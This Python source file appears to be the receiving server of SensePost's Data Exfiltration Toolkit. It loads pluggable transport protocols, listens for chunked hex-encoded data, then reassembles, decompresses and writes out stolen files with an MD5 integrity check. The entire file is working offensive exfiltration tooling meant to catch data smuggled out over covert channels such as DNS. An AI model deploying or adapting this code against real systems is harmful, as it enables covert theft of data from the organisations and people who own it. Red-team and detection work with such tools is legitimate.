# -*- coding: utf-8 -*-
import argparse
import hashlib
import json
import os
import random
import signal
import sys
import threading
import time
from zlib import decompress

KEY = ""
MIN_TIME_SLEEP = 1
MAX_TIME_SLEEP = 30
MIN_BYTES_READ = 1
MAX_BYTES_READ = 500
COMPRESSION = True
files = {}
threads = []
config = None


class Colors:
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    ENDC = '\033[0m'


def display_message(message):
    print("[%s] %s" % (time.strftime("%Y-%m-%d.%H:%M:%S", time.gmtime()), message))


def warning(message):
    display_message("%s%s%s" % (Colors.WARNING, message, Colors.ENDC))


def ok(message):
    display_message("%s%s%s" % (Colors.OKGREEN, message, Colors.ENDC))


def info(message):
    display_message("%s%s%s" % (Colors.OKBLUE, message, Colors.ENDC))


# # http://stackoverflow.com/questions/12524994/encrypt-decrypt-using-pycrypto-aes-256
# def aes_encrypt(message, key=KEY):
#     try:
#         # Generate random CBC IV
#         iv = os.urandom(AES.block_size)
#
#         # Derive AES key from passphrase
#         aes = AES.new(hashlib.sha256(key).digest(), AES.MODE_CBC, iv)
#
#         # Add PKCS5 padding
#         pad = lambda s: s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)
#
#         # Return data size, iv and encrypted message
#         return iv + aes.encrypt(pad(message))
#     except:
#         return None
#
#
# def aes_decrypt(message, key=KEY):
#     try:
#         # Retrieve CBC IV
#         iv = message[:AES.block_size]
#         message = message[AES.block_size:]
#
#         # Derive AES key from passphrase
#         aes = AES.new(hashlib.sha256(key).digest(), AES.MODE_CBC, iv)
#         message = aes.decrypt(message)
#
#         # Remove PKCS5 padding
#         unpad = lambda s: s[:-ord(s[len(s) - 1:])]
#
#         return unpad(message)
#     except:
#         return None


# Do a md5sum of the file
def md5(fname):
    hash_function = hashlib.md5()
    with open(fname) as f:
        for chunk in iter(lambda: f.read(4096), ""):
            hash_function.update(chunk)
    return hash_function.hexdigest()


function_mapping = {
    'display_message': display_message,
    'warning': warning,
    'ok': ok,
    'info': info
}


class Exfiltration(object):
    def __init__(self, results, key):
        self.KEY = key
        self.protocol_manager = None
        self.protocol = {}
        self.results = results
        self.target = "127.0.0.1"

        path = "protocols/"
        protocol = {}

        sys.path.insert(0, path)
        for f in os.listdir(path):
            fname, ext = os.path.splitext(f)
            if ext == '.py' and self.should_use_protocol(fname):
                mod = __import__(fname)
                protocol[fname] = mod.Protocol(self, config["protocols"][fname])

    def should_use_protocol(self, protocol_name):
        if self.results.protocol and protocol_name not in self.results.protocol.split(','):
            return False
        else:
            return True

    def register_protocol(self, transport_method, functions):
        self.protocol[transport_method] = functions
        self.protocol['config'] = config

    def get_protocol_function(self):
        protocol_name = random.sample(self.protocol, 1)[0]
        return self.protocol[protocol_name]['listen']

    def log_message(self, mode, message):
        if mode in function_mapping:
            function_mapping[mode](message)

    def register_file(self, jobid, file_name):
        global files
        if jobid not in files:
            files[jobid] = {}
            files[jobid]['filename'] = file_name.lower()
            files[jobid]['data'] = []
            files[jobid]['packets_number'] = []
            warning("Register packet for file %s" % files[jobid]['filename'])

    def retrieve_file(self, jobid, checksum):
        global files
        fname = files[jobid]['filename']
        filename = "%s.%s" % (fname.replace(os.path.pathsep, ''), time.strftime("%Y-%m-%d.%H:%M:%S", time.gmtime()))
        content = ''.join(str(v) for v in files[jobid]['data']).decode('hex')

        if COMPRESSION:
            content = decompress(content)
        f = open(filename, 'w')
        f.write(content)
        f.close()
        if checksum == md5(filename):
            ok("File %s recovered" % fname)
        else:
            warning("File %s corrupt!" % fname)
        del files[jobid]

    def retrieve_data(self, jobid, packet_index, data):
        global files
        try:
            info("Received {0} bytes".format(len(data)))

            if jobid in files and packet_index not in files[jobid]['packets_number']:
                files[jobid]['data'].append(''.join(data))
                files[jobid]['packets_number'].append(packet_index)
        except:
            pass


def signal_handler():
    global threads
    warning('Killing DET and its subprocesses')
    os.kill(os.getpid(), signal.SIGKILL)


def main():
    global COMPRESSION, threads, config

    parser = argparse.ArgumentParser(
        description='Data Exfiltration Toolkit (SensePost)')
    parser.add_argument('-c', action="store", dest="config", default=None,
                        help="Configuration file (eg. '-c ./config-sample.json')")
    parser.add_argument('-p', action="store", dest="protocol",
                        default=None, help="Plugins to use (eg. '-p dns,twitter')")
    results = parser.parse_args()

    if results.config is None:
        print("Specify a configuration file!")
        parser.print_help()
        sys.exit(-1)

    with open(results.config) as data_file:
        config = json.load(data_file)

    # catch Ctrl+C
    signal.signal(signal.SIGINT, signal_handler)
    ok("CTRL+C to kill DET")

    COMPRESSION = bool(config['compression'])
    app = Exfiltration(results, KEY)

    threads = []
    function = app.get_protocol_function()
    thread = threading.Thread(target=function)
    thread.daemon = True
    thread.start()
    threads.append(thread)

    # Join for the threads
    for thread in threads:
        while True:
            thread.join(1)
            if not thread.isAlive():
                break


if __name__ == '__main__':
    main()
